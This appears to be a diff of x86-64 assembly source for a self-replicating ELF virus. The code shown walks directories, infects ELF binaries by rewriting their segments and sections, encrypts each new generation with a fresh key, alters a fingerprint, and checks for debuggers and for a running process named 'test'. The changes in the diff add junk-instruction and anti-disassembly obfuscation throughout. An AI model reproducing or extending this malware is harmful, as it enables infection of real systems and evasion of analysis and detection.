@@ -5,34 +5,34 @@ global _start
 
 _start:
 	PUSHAQ
-	BIG_OBF2 ; no more IDA
+	BIG_OBF
 key:
 	mov rdi, 0x8037ee39550c7610
-	OBF
+	JNK2
 	mov rsi, 0x8037ee39550c7610
 
-	lea rax, [rel decryptor]
+	lea rax, [rel key]
 	sub r10, r10
 	OBF
-	xor r10, main - decryptor
+	xor r10, main - key
 	add rax, r10
 	OBF
 	cmp rdi, rsi
 	je no_decryptor
 
+	JNK2
 	lea rsi, [rel encryption_start]
 	lea rdx, [rel encryption_end]
 	sub rdx, rsi
 	push rax
 	OBF
-	call decryptor
-	pop rax
+	jmp decryptor
 	no_decryptor:
-	BIG_OBF2
+	BIG_OBF
 	jmp rax
+	db 0xeb
 
 decryptor:	;rdi:key  rsi:addr rdx:size
-	enter 0, 0
 	xor rcx, rcx
 	while_decrypt:
 		OBF
@@ -47,6 +47,7 @@ decryptor:	;rdi:key  rsi:addr rdx:size
 			mov r10, r9
 			mov r9, 8
 			sub r9, r10
+			JNK2
 			imul r9, 8
 			push rcx
 			mov rcx, r9
@@ -57,38 +58,39 @@ decryptor:	;rdi:key  rsi:addr rdx:size
 		end_trunc:
 		mov r9, QWORD [rsi]
 		xor r9, rdi
+		JNK1
 		mov QWORD [rsi], r9
 		add rsi, 8
 		add rcx, 8
 		OBF
 		jmp while_decrypt
+		db 0xeb
 	end_decryptor:
-	leave
-	ret
+	pop rax
+	jmp no_decryptor
 	db 0xeb
 
 encryption_start:
 memcpy:
-	enter 0, 0
+	ENTER_OBF
+	BIG_OBF
 	mov rcx, rdx
 	cld
 	rep movsb
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 memset:
-	enter 0, 0
+	ENTER_OBF
 	mov rax, rsi
 	mov rcx, rdx
 	cld
 	rep stosb
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 strcmp:
-	enter 0, 0
+	ENTER_OBF
 	push r8
 	dec rsi
 	dec rdi
@@ -105,12 +107,11 @@ strcmp:
 	mov al, byte[rdi]
 	sub al, byte[rsi]
 	pop r8
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 strcat:
-	enter 0, 0
+	ENTER_OBF
 	push r8
 	push rdi
 	call strlen
@@ -126,12 +127,11 @@ strcat:
 		jne strcat_while
 	mov byte[rdi], 0
 	pop r8
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 strlen:
-	enter 0, 0
+	ENTER_OBF
 	push rsi
 	mov rax, 0
 	mov rsi, rdi
@@ -143,12 +143,11 @@ strlen:
 	sub rsi, rdi
 	mov rax, rsi
 	pop rsi
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 check_addr:		;	rdi:elf_struc  rsi:addr
-	enter 0, 0
+	ENTER_OBF
 	push r13
 	mov r13, QWORD[rdi + elf_struc.ptr_end]
 	mov rdi, QWORD[rdi + elf_struc.ptr]
@@ -162,12 +161,11 @@ check_addr:		;	rdi:elf_struc  rsi:addr
 	mov rax, 0
 	check_addr_ret:
 	pop r13
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 check_str_in_addr:	; rdi:elf_struc rsi:str
-	enter 0, 0
+	ENTER_OBF
 	chk_one_byte:
 	push rdi
 	push rsi
@@ -181,12 +179,11 @@ check_str_in_addr:	; rdi:elf_struc rsi:str
 	cmp al, 0
 	jne chk_one_byte
 	mov rax, 1
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 modify_sections:
-	enter 0, 0
+	ENTER_OBF
 	mov r8, rdi									;r8 contient elf_struc
 	mov r9, QWORD[r8 + elf_struc.ehdr]			;r9 contient ehdr
 	xor r10, r10
@@ -225,12 +222,11 @@ modify_sections:
 		jmp while_shdr_to_modify
 	end_while_shdr_to_modify:
 	mov rax, 1
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 modify_segments:
-	enter 0, 0
+	ENTER_OBF
 	mov r8, rdi									;r8 contient elf_struc
 	mov r9, QWORD[r8 + elf_struc.ehdr]			;r9 contient ehdr
 	xor r10, r10
@@ -311,12 +307,11 @@ modify_segments:
 		jmp while_data_phdr
 	end_while_data_phdr:
 	mov rax, QWORD[r8 + elf_struc.data_phdr]
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 fill_data_sec:
-	enter 0, 0
+	ENTER_OBF
 	mov r8, rdi									;r8 contient elf_struc
 	mov r9, QWORD[r8 + elf_struc.ehdr]			;r9 contient ehdr
 	xor r10, r10
@@ -392,12 +387,11 @@ fill_data_sec:
 	end_while_data_shdr:
 
 	mov rax, QWORD[r8 + elf_struc.data_shdr]
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 encrypt_new_gen:	; rdi:bin_addr
-	enter 0, 0
+	ENTER_OBF
 	push rdi
 	lea rdi, [rel rand_file]
 	mov rsi, OPEN_FILE_PERMISSION
@@ -420,6 +414,11 @@ encrypt_new_gen:	; rdi:bin_addr
 	syscall
 	padding
 
+	jmp worked
+	didnt_word:
+	xor rdi, rdi
+	mov QWORD[rsp], rdi
+	worked:
 	mov rdi, QWORD[rsp]		;rdi has the key
 	add rsp, 8
 
@@ -433,12 +432,11 @@ encrypt_new_gen:	; rdi:bin_addr
 	mov rdx, encryption_end - encryption_start
 	call decryptor
 
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 change_fingerprint:	;rdi:addr   rsi:key
-	enter 0, 0
+	ENTER_OBF
 	mov rcx, 8
 	shr rsi, 32
 	dec rdi
@@ -462,12 +460,11 @@ change_fingerprint:	;rdi:addr   rsi:key
 		mov BYTE[rdi], dl
 		jmp while_rcx
 	while_rcx_end:
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 rewrite_binary:
-	enter 0, 0
+	ENTER_OBF
 	mov r11, rdi	;r11 contient elf_struc
 
 	mov rdi, 0
@@ -604,9 +601,10 @@ rewrite_binary:
 	padding
 
 	jmp ret_1
+	db 0xeb
 
 infect_elf:		; r8:elf_struc
-	enter 0, 0
+	ENTER_OBF
 	mov r8, rdi
 	mov rax, QWORD[r8 + elf_struc.stat + stat.st_size]
 	cmp rax, 64								; test if ehdr is in the file
@@ -681,12 +679,11 @@ infect_elf:		; r8:elf_struc
 	je infect_elf_end
 
 	infect_elf_end:
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 process_file:
-	enter 0, 0
+	ENTER_OBF
 	sub rsp, ELF_STRUC_SIZE
 	mov QWORD[rsp + elf_struc.path], rdi
 
@@ -760,12 +757,11 @@ process_file:
 	padding
 	process_file_end:
 	mov rax, 0
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 check_proc:
-	enter 0, 0
+	ENTER_OBF
 	sub rsp, NAME_SIZE + CONTENT_SIZE
 
 	mov r8, rdi
@@ -812,12 +808,11 @@ check_proc:
 	proc_ret_0:
 	mov rax, 0
 	proc_end:
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 process_dir:			;  r12:fd   r13:folder   r9:getends ret    r8:buffer   r10:function pointer		r11:ret value
-	enter 0, 0
+	ENTER_OBF
 	sub rsp, DIRENT_SIZE + NAME_SIZE
 	mov r13, rdi
 	mov r10, rsi
@@ -843,6 +838,17 @@ process_dir:			;  r12:fd   r13:folder   r9:getends ret    r8:buffer   r10:functi
 		add r9, rsp
 		mov rcx, rsp
 		file_listing:
+			lea rdi, [rcx + linux_dirent.d_name]
+			call strlen
+			push rax
+			lea rdi, [rbp - NAME_SIZE]
+			call strlen
+			pop rdi
+			add rax, rdi
+			add rax, 2
+			cmp rax, NAME_SIZE
+			jg ret_
+
 			lea rdi, [rcx + linux_dirent.d_name]
 			lea rsi, [rel dot]
 			call strcmp
@@ -896,18 +902,18 @@ process_dir:			;  r12:fd   r13:folder   r9:getends ret    r8:buffer   r10:functi
 	pop r11
 	end_process_dir:
 	mov rax, r11
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 
 
 check_debug:
-	enter 0, 0
+	ENTER_OBF
 	sub rsp, NAME_SIZE + 8
 	lea rdi, [rel self_status]
 	mov rsi, OPEN_PROC_PERMISSION
 	SYS_NUM sys_open
+	JNK2
 	syscall
 	padding
 	cmp rax, 0
@@ -917,6 +923,7 @@ check_debug:
 	lea rsi, [rsp + 8]
 	mov rdx, NAME_SIZE
 	SYS_NUM sys_read
+	OBF
 	syscall
 	padding
 	mov rbx, rax
@@ -927,6 +934,7 @@ check_debug:
 		cmp rcx, rbx
 		je debuged_ret_0
 		mov rdi, QWORD[rsp + 8 + rcx]
+		JNK1
 		mov rsi, 0x6950726563617254
 		cmp rdi, rsi
 		jne while_trac_not_found
@@ -937,6 +945,7 @@ check_debug:
 	je debuged_ret_0
 
 	mov rax, 1
+	JNK2
 	jmp debuged_end
 	debuged_ret_0:
 	mov rax, 0
@@ -944,31 +953,36 @@ check_debug:
 	push rax
 	mov rdi, QWORD[rsp + 8]
 	SYS_NUM sys_close
+	OBF
 	syscall
 	padding
 	pop rax
-	leave
-	ret
+	jmp ret_
 	db 0xeb
 
 
 main:
-	BIG_OBF2
+	BIG_OBF
 	call check_debug
 	cmp rax, 1
 	je jmp_old_entry
 	lea rdi, [rel proc_dir]
+	JNK1
 	lea rsi, [rel check_proc]
 	OBF
 	call process_dir
+	JNK2
 	cmp rax, 1
 	je jmp_old_entry
+	OBF
 	lea rdi, [rel dir1]
+	BIG_OBF
 	lea rsi, [rel process_file]
-	BIG_OBF2
 	call process_dir
 	lea rdi, [rel dir2]
+	JNK2
 	lea rsi, [rel process_file]
+	BIG_OBF
 	call process_dir
 	jmp jmp_old_entry
 
@@ -984,13 +998,20 @@ ret_1:
 	ret
 	db 0xeb
 
+ret_:
+	leave
+	ret
+	db 0xeb
+
 jmp_old_entry:
 	mov rdi, 0x2322a163f2fcad26
+	JNK2
 	mov rsi, 0x2322a163f2fcad26
 	cmp rdi, rsi
 	jne the_jump							; exit if real famine
 		SYS_NUM sys_exit
 		sub rdi, rsi
+		JNK1
 		syscall
 	the_jump:
 	lea rax, [rel _start]
@@ -1007,9 +1028,9 @@ self_status:
 proc_dir:
 	db '/proc/', 0
 proc_name_file:
-	db 0x2f, 0x63, 0x6f, 0x6d, 0x6d, 0
+	db '/comm', 0
 proc_ban:
-	db 0x74, 0x65, 0x73, 0x74, 0x0a, 0
+	db 'test', 0x0a, 0
 new_line:
 	db 0x0a, 0
 rand_file:
